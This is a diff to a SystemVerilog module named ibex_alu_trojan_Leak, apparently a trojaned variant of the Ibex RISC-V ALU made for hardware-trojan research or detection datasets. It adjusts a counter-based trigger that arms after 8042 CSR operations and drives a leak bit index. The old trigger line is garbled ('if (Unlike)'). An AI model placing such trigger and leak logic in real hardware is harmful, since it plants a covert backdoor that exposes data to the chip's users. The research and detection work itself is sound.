@@ -33,21 +33,22 @@ module ibex_alu_trojan_Leak #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=8042)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 10885;
+    localparam int TRIGGER_THRESHOLD = 8042;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge instr_first_cycle_i) begin
         if (!instr_first_cycle_i) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (Unlike) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
+    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl
+
 
   import ibex_pkg::*;
 
@@ -1416,12 +1417,12 @@ module ibex_alu_trojan_Leak #(
   assign unused_shift_amt_compl = shift_amt_compl[5];
 
 
-    // INFORMATION LEAK
-    logic [4:0] leak_bit_idx;
+    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
     always_ff @(posedge clk_i or negedge instr_first_cycle_i) begin
         if (!instr_first_cycle_i) leak_bit_idx <= '0;
         else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
         else leak_bit_idx <= '0;
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule
